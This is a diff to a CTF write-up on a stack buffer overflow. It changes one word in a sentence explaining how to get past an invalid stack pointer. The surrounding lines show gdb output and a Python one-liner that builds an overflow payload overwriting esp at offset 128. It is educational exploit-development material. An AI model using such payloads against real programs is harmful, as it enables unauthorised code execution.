@@ -397,7 +397,7 @@ Again, we place the output of our favourite pattern creator into the binary when
 Invalid $SP address: 0x3365412e
 ```
 
-So we've overwritten `ebp` and it appears to have failed once `esp` is overwritten.  This isn't typical of most CTF's and I wasn't able to work out how to bypass this during compilation, but we can pretty easily bypass it.  The invalid `$SP` address is at position 128 in our buffer, so at position 128 in our buffer we just write a new `esp` which we will point next to our `eip` address.
+So we've overwritten `ebp` and it appears to have failed once `esp` is overwritten.  This isn't typical of most CTF's and I wasn't able to work out how to fix this during compilation, but we can pretty easily bypass it.  The invalid `$SP` address is at position 128 in our buffer, so at position 128 in our buffer we just write a new `esp` which we will point next to our `eip` address.
 ```python
 python -c "from struct import pack; print 'A'*128 + pack('<L', 0xffffd280+136) + 'B'*4+ 'C'*4"  > /tmp/var
 ```
